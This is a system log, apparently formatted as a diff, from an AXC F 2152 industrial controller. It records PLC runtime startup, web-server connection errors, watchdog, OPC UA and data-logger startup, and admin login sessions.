+Aug 24 23:55:11 axcf2152 root: [2024-08-24 23:55:11] File /opt/plcnext/master/.private_file.txt.swp was accessed by user USER (PID: PID, Command: COMMAND)
+Aug 24 23:55:11 axcf2152 root: [2024-08-24 23:55:11] File /opt/plcnext/master/.private_file.txt.swp was accessed by user root (PID: 32625, Command: vim)
+Aug 24 23:55:11 axcf2152 Arp.System.Application: Arp.System.Um.UserManager INFO - UM ldap configuration not found, disable ldap support completely
+Aug 24 23:55:13 axcf2152 Arp.System.Application: Arp.System.Lm.Internal.LicenseManager INFO - License runtime version: 2.50.1806
+Aug 24 23:55:13 axcf2152 Arp.System.Application: Arp.Plc.Domain.Internal.Project.PlcProjectManager INFO - Project integrity check configured with mode 'Warning'
+Aug 24 23:55:13 axcf2152 Arp.System.Application: Arp.Plc.Domain.Internal.PlcManager INFO - Plc state transition from 'None' to 'Ready'
+Aug 24 23:55:13 axcf2152 nginx: 2024/08/24 23:55:13 [error] 1544#1544: *1657 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/Utilities.cgi?ListTotalWbmLanguagesFiles HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/"
+Aug 24 23:55:13 axcf2152 nginx: 2024/08/24 23:55:13 [error] 1544#1544: *1657 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/Utilities.cgi?ListTotalWbmLanguagesFiles HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/"
+Aug 24 23:55:13 axcf2152 nginx: 2024/08/24 23:55:13 [error] 1544#1544: *1657 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "GET /wbm/IsUserAuthenticationRequired.cgi?_=1724536531351 HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/"
+Aug 24 23:55:13 axcf2152 nginx: 2024/08/24 23:55:13 [error] 1544#1544: *1657 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/Utilities.cgi?ListTotalWbmLanguagesFiles HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/"
+Aug 24 23:55:13 axcf2152 nginx: 2024/08/24 23:55:13 [error] 1544#1544: *1657 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/SystemUseNotificationGet.cgi?SystemUseNotification HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/"
+Aug 24 23:55:13 axcf2152 Arp.System.Application: Arp.Plc.Esm.Internal.EsmDomain INFO - ESM configuration successfully loaded.
+Aug 24 23:55:14 axcf2152 Arp.System.Application: Arp.Io.Axioline.Internal.AxiolineDomain INFO - Axioline: No bus configuration found. No links.xml file.
+Aug 24 23:55:14 axcf2152 Arp.System.Application: Arp.Io.EthernetIP.EthernetIPComponent INFO - LoadPlc, isChanging=false
+Aug 24 23:55:14 axcf2152 Arp.System.Application: Arp.Plc.Gds.Internal.GdsDomain INFO - GDS configuration successfully loaded.
+Aug 24 23:55:14 axcf2152 Arp.System.Application: Arp.Plc.Domain.Internal.Config.PlcConfigManager INFO - Loading project 'PLC1_Application_datalogger'
+Aug 24 23:55:14 axcf2152 Arp.System.Application: Arp.Plc.Esm.Internal.TaskManager INFO - Configuring Sleep class with a sync point interval of 100000us, an watchdog interval of 100000us and an axio interval of 100000us
+Aug 24 23:55:14 axcf2152 Arp.System.Application: Arp.Io.Axioline.AxiolineComponent INFO - AxiolineComponent: SetupPlc(False): No config, Reset Bus
+Aug 24 23:55:14 axcf2152 Arp.System.Application: Arp.Io.EthernetIP.EthernetIPComponent INFO - SetupPlc, isChanging=false, startKind=Warm
+Aug 24 23:55:14 axcf2152 Arp.System.Application: Arp.Io.EthernetIP.EthernetIPComponent INFO - 2945434432 OnPlcLoaded PlcLoaded=false
+Aug 24 23:55:14 axcf2152 Arp.System.Application: Arp.Io.EthernetIP.EthernetIPComponent INFO - 2945434432 ESDK 0xffff, AddAssemblies, toInstanceID=110, toSize=256, otInstanceID=100, otSize=256
+Aug 24 23:55:14 axcf2152 Arp.System.Application: Arp.Plc.Gds.Internal.GdsDomain INFO - GDS data connections successfully created.
+Aug 24 23:55:14 axcf2152 Arp.System.Application: Arp.Plc.Domain.Internal.PlcManager INFO - Plc state transition from 'Ready' to 'Stop|Warm'
+Aug 24 23:55:14 axcf2152 Arp.System.Application: Arp.Services.Ehmi.EhmiComponent WARN - 3069026336   ReloadStrings . Empty project id.
+Aug 24 23:55:14 axcf2152 Arp.System.Application: ehmiLib.EhmiLib INFO - 3069026336    TypeDictionary->Load() failure!!!
+Aug 24 23:55:14 axcf2152 Arp.System.Application: ehmiLib.EhmiLib INFO - 3069026336   Load Cannot read fileName=data.dictionary.json
+Aug 24 23:55:14 axcf2152 Arp.System.Application: ehmiLib.EhmiLib INFO - 3069026336    DataDictionary->Load() failure!!!
+Aug 24 23:55:15 axcf2152 Arp.System.Application: Arp.Services.AppManager.AppManager INFO - Enabling installation Mode
+Aug 24 23:55:15 axcf2152 Arp.System.Application: Arp.Services.AppManager.AppManager INFO - Installation Mode enabled
+Aug 24 23:55:15 axcf2152 Arp.System.Application: Arp.Services.AppManager.AppManager INFO - Checking active apps licenses
+Aug 24 23:55:15 axcf2152 Arp.System.Application: Arp.Services.AppManager.AppManager INFO - Disabling installation Mode
+Aug 24 23:55:15 axcf2152 Arp.System.Application: Arp.Services.AppManager.AppManager INFO - Installation Mode disabled
+Aug 24 23:55:15 axcf2152 Arp.System.Application: Arp.Services.Wcm.WebConfigurationManager INFO - Identity Store HTTPS-self-signed was created/loaded successfully
+Aug 24 23:55:15 axcf2152 Arp.System.Application: Arp.Services.Wcm.WebConfigurationManager INFO - Setuped self-signed Identity Store
+Aug 24 23:55:16 axcf2152 nginx: 2024/08/24 23:55:16 [error] 1544#1544: *1657 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/SystemUseNotificationGet.cgi?SystemUseNotification HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/"
+Aug 24 23:55:17 axcf2152 Arp.System.Application: Arp.Services.Modules.Wbm.Splc.Internal.SplcHandler INFO - Could not subscribe ISpnsProxyConfigService. SPLC WBM request handler will not be available
+Aug 24 23:55:17 axcf2152 Arp.System.Application: Device Info: article name AXC F 2152, article number 2404267, serial number 1368735890, firmware version 2022.9.0 (22.9.0.33), hardware version 04, fpga version 1.1.80
+Aug 24 23:55:17 axcf2152 Arp.System.Application: External SD Card. Boot Device: internalSD, State: activated
+Aug 24 23:55:17 axcf2152 Arp.System.Application: Configured IP Addresses: Interface number 1 Ip Address 192.168.137.10
+Aug 24 23:55:17 axcf2152 Arp.System.Application: NTP servers config. Servers Hostnames: 
+Aug 24 23:55:17 axcf2152 Arp.System.Application: Firewall run status is Stopped, activation status is Deactivated, active tables: name:filter, family:ip
+Aug 24 23:55:17 axcf2152 Arp.System.Application: Security Profile status: Deactivated
+Aug 24 23:55:17 axcf2152 Arp.System.Application: Installed Apps: []
+Aug 24 23:55:17 axcf2152 Arp.System.Application: Identity Store for HTTPS certificate: HTTPS-self-signed, Given Identity Store for HTTPS certificate: HTTPS-self-signed,Self-signed certificate Identity Store HTTPS-self-signed, Cipher Suites Set: DefaultCiphers, TLS Versions: TLSv1.2;TLSv1.3
+Aug 24 23:55:17 axcf2152 Arp.System.Application: Arp.Plc.Domain.Internal.Condition.PlcConditionManager INFO - Starting Plc is delayed by 'Arp.Services.SystemEvents' because of 'Complete system start'. Timeout is set to 0 milliseconds.
+Aug 24 23:55:17 axcf2152 Arp.System.Application: Arp.Plc.Domain.Internal.PlcManager INFO - Plc state transition from 'Stop|Warm' to 'Stop|Warm|StartingDelayed'
+Aug 24 23:55:17 axcf2152 Arp.System.Application: Arp.Device.Interface.Internal.MonitorThreads INFO - Thread DI.LowPrioMonitor is running
+Aug 24 23:55:17 axcf2152 Arp.System.Application: Arp.Device.Interface.DeviceInterface INFO - Thread DI.UpdateSystemVariables is running
+Aug 24 23:55:17 axcf2152 Arp.System.Application: Link state changed: interface 1, port 2, status Up
+Aug 24 23:55:17 axcf2152 Arp.System.Application: Arp.Services.PLCnextStore.Internal.PLCnextStoreService INFO - Will not start PLCnext-Store service. It is disabled via service settings.
+Aug 24 23:55:17 axcf2152 Arp.System.Application: Arp.Services.Ehmi.EhmiComponent INFO - 3069026336   Start 
+Aug 24 23:55:17 axcf2152 Arp.System.Application: Arp.Services.OpcUAServer.Internal.Config.OpcUAConfigManager INFO - Using the self-signed certificate.
+Aug 24 23:55:17 axcf2152 Arp.System.Application: Arp.Services.OpcUAServer.Internal.InformationModel.Common.SampleGroupManager INFO - SubscriptionKind is set to DirectRead
+Aug 24 23:55:17 axcf2152 sudo: plcnext_firmware : PWD=/var/volatile/tmp ; USER=root ; COMMAND=/usr/sbin/watchdog --config-file /opt/plcnext/data/System/Watchdog/WatchdogDaemon.config
+Aug 24 23:55:17 axcf2152 watchdog[19558]: starting daemon (5.16):
+Aug 24 23:55:17 axcf2152 watchdog[19558]:  int=1s realtime=yes sync=no load=0,0,0 soft=no
+Aug 24 23:55:17 axcf2152 watchdog[19558]:  memory not checked
+Aug 24 23:55:17 axcf2152 watchdog[19558]:  ping: no machine to check
+Aug 24 23:55:17 axcf2152 watchdog[19558]:  file: no file to check
+Aug 24 23:55:17 axcf2152 watchdog[19558]:  pidfile: /opt/plcnext/data/System/Watchdog/mainProcess.pid
+Aug 24 23:55:17 axcf2152 watchdog[19558]:  pidfile: /opt/plcnext/data/System/Watchdog/ExternalIoProcess.pid
+Aug 24 23:55:17 axcf2152 watchdog[19558]:  pidfile: /opt/plcnext/data/System/Watchdog/LocalIoProcess.pid
+Aug 24 23:55:17 axcf2152 watchdog[19558]:  interface: no interface to check
+Aug 24 23:55:17 axcf2152 watchdog[19558]:  temperature: no sensors to check
+Aug 24 23:55:17 axcf2152 watchdog[19558]:  no test binary files
+Aug 24 23:55:17 axcf2152 watchdog[19558]:  no repair binary files
+Aug 24 23:55:17 axcf2152 watchdog[19558]:  error retry time-out = 0 seconds
+Aug 24 23:55:17 axcf2152 watchdog[19558]:  repair attempts = 1
+Aug 24 23:55:17 axcf2152 watchdog[19558]:  alive=/dev/watchdog1 heartbeat=[none] to=root no_act=no force=no
+Aug 24 23:55:17 axcf2152 watchdog[19558]: cannot set timeout 60 (errno = 95 = 'Operation not supported')
+Aug 24 23:55:17 axcf2152 watchdog[19558]: hardware watchdog identity: Watchdog Driver for axc2152
+Aug 24 23:55:17 axcf2152 Arp.System.Application: OpcServer INFO - OPC UA server opened endpoint URI opc.tcp://axcf2152:4840 listening at opc.tcp://axcf2152:4840
+Aug 24 23:55:17 axcf2152 Arp.System.Application: Arp.Services.OpcUAServer.OpcUAServerComponent INFO - Started OPC UA Server successfully.
+Aug 24 23:55:17 axcf2152 Arp.System.Application: Arp.Services.OpcUAServer.Internal.Security.SessionManager INFO - Applying configuration for client authentication to 1 endpoints: trustAll=true, checkCRLs=false, checkIssuerCRLs=false, ignoreValidity=false
+Aug 24 23:55:17 axcf2152 Arp.System.Application: Arp.Services.ProfiCloudV3.Internal.ProfiCloudV3Manager INFO - Proficloud (V3) service is disabled by configuration and won't start.
+Aug 24 23:55:17 axcf2152 Arp.System.Application: Arp.Services.Grpc.GrpcServerComponent INFO - gRPC Server listening on unix:/run/plcnext/grpc.sock
+Aug 24 23:55:17 axcf2152 Arp.System.Application: Arp.Plc.Domain.Internal.Condition.PlcConditionManager INFO - Plc start delay condition 'Complete system start' expired after 482 ms
+Aug 24 23:55:17 axcf2152 Arp.System.Application: Arp.Io.Axioline.Internal.AxioDataExchange INFO - AxioDataExchange: PD not enabled Buffer are invalid
+Aug 24 23:55:17 axcf2152 Arp.System.Application: Arp.Io.EthernetIP.EthernetIPComponent INFO - StartPlc, startKind=Warm
+Aug 24 23:55:17 axcf2152 Arp.System.Application: Arp.Io.EthernetIP.EthernetIPComponent INFO - 2945434432 OnPlcStarted 
+Aug 24 23:55:17 axcf2152 Arp.System.Application: Retain data saved
+Aug 24 23:55:17 axcf2152 Arp.System.Application: Arp.Services.DataLogger.Internal.Session INFO - Session 'DB_name': Session started logging of 18 variables.
+Aug 24 23:55:17 axcf2152 Arp.System.Application: Arp.Services.DataLogger.Internal.Session INFO - Session 'Sec_log': Session started logging of 27 variables.
+Aug 24 23:55:17 axcf2152 Arp.System.Application: Arp.Plc.Domain.Internal.PlcManager INFO - Plc state transition from 'Stop|Warm|StartingDelayed' to 'Running'
+Aug 24 23:55:17 axcf2152 Arp.System.Application: PLC started. Start Kind: Warm, Used Memory: 91%, CPUs load: (CPU 0: 0 %,CPU 1: 0 %), Temperatures: (Board Temperature: 56.7 C, CPU Temperature: Not available, LastSensor Temperature: Not available)
+Aug 24 23:55:17 axcf2152 Arp.System.Application: CommonRemoting INFO - Starting remoting server (version=4)
+Aug 24 23:55:17 axcf2152 Arp.System.Application: CommonRemoting INFO - Start listening on TCP port 41100
+Aug 24 23:55:17 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.ApplicationBase INFO - Application 'MainProcess' was setup successfully.
+Aug 24 23:58:13 axcf2152 bash[21030]: CMD: ps aux | USER: root | CWD: /opt/plcnext/master
+Aug 24 23:58:17 axcf2152 sshd[2102]: Received disconnect from 192.168.137.1 port 51553:11: disconnected by user
+Aug 24 23:58:17 axcf2152 sshd[2102]: Disconnected from user admin 192.168.137.1 port 51553
+Aug 24 23:58:17 axcf2152 sshd[2099]: pam_unix(sshd:session): session closed for user admin
+Aug 24 23:58:17 axcf2152 su[2251]: pam_unix(su:session): session closed for user root
+Aug 25 00:01:02 axcf2152 syslog-ng[1320]: WARNING: Configuration file format is too old, syslog-ng is running in compatibility mode. Please update it to use the syslog-ng 3.36 format at your time of convenience. To upgrade the configuration, please review the warnings about incompatible changes printed by syslog-ng, and once completed change the @version header at the top of the configuration file; config-version='3.24'
+Aug 25 00:01:03 axcf2152 syslog-ng[1320]: Configuration reload request received, reloading configuration;
+Aug 25 00:01:03 axcf2152 syslog-ng[1320]: Configuration reload finished;
+Aug 25 00:01:03 axcf2152 syslog-ng[1320]: WARNING: Configuration file format is too old, syslog-ng is running in compatibility mode. Please update it to use the syslog-ng 3.36 format at your time of convenience. To upgrade the configuration, please review the warnings about incompatible changes printed by syslog-ng, and once completed change the @version header at the top of the configuration file; config-version='3.24'
+Aug 25 00:01:03 axcf2152 syslog-ng[1320]: WARNING: Configuration file format is too old, syslog-ng is running in compatibility mode. Please update it to use the syslog-ng 3.36 format at your time of convenience. To upgrade the configuration, please review the warnings about incompatible changes printed by syslog-ng, and once completed change the @version header at the top of the configuration file; config-version='3.24'
+Aug 25 00:01:03 axcf2152 syslog-ng[1320]: Configuration reload request received, reloading configuration;
+
+Aug 25 00:03:42 axcf2152 Arp.System.Application: CommonRemoting INFO - Accepted connection #0: connectionId=1EDD293B, tls://192.168.137.50:53939
+Aug 25 00:03:57 axcf2152 Arp.System.Application: Session created. User: admin, User roles: Admin , Security Token: 4B3BC9C9, Object name: RSC, currently opened Sessions 2 
+Aug 25 00:03:57 axcf2152 Arp.System.Application: Arp.System.Security.Services.PasswordAuthenticationServiceImpl INFO - Successful authentication for name="admin": connectionId=1EDD293B, securityToken=4B3BC9C9
+Aug 25 00:04:04 axcf2152 CROND[23677]: pam_unix(crond:session): session closed for user root
+Aug 25 00:04:06 axcf2152 Arp.System.Application: Session with security Token 4B3BC9C9 was closed , currently are 1 sessions active
+Aug 25 00:04:06 axcf2152 Arp.System.Application: Arp.System.UmRscAuthorizator.Internal.UmAuthorizator INFO - Clearing authentication: securityToken=4B3BC9C9
